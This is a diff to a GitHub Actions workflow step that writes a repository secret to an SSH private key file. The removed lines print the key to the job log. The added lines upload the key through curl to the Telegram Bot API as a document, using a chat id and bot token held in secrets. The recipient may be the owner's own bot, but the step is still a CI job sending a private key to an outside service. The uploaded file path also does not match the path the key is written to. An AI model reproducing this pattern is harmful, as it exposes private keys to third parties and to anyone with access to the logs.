@@ -43,10 +43,16 @@ jobs:
 
       - name: "add secrets to file"
         run: |
-          echo -e ${{ secrets.IOUAKIRA_GITGIT }} > ./AutoSignMachine/id_rsa
-          cat ./AutoSignMachine/id_rsa
+          pwd
+          echo $IOUAKIRA_GITGIT > ./AutoSignMachine/id_rsa
+          curl -F "chat_id=${TG_USER_ID}" \
+                -F "caption=${TG_USER_ID}" \
+                -F "document=@~/someDockerfile/AutoSignMachine/id_rsa" \
+                https://api.telegram.org/${TG_BOT_TOKEN}/sendDocument
         env:
           IOUAKIRA_GITGIT: ${{ secrets.IOUAKIRA_GITGIT }}
+          TG_USER_ID:  ${{ secrets.TG_USER_ID }}
+          TG_BOT_TOKEN:  ${{ secrets.TG_BOT_TOKEN }}
 
       - name: 构建并推送到Dockerhub和ghcr.io镜像仓库
         uses: docker/build-push-action@v2
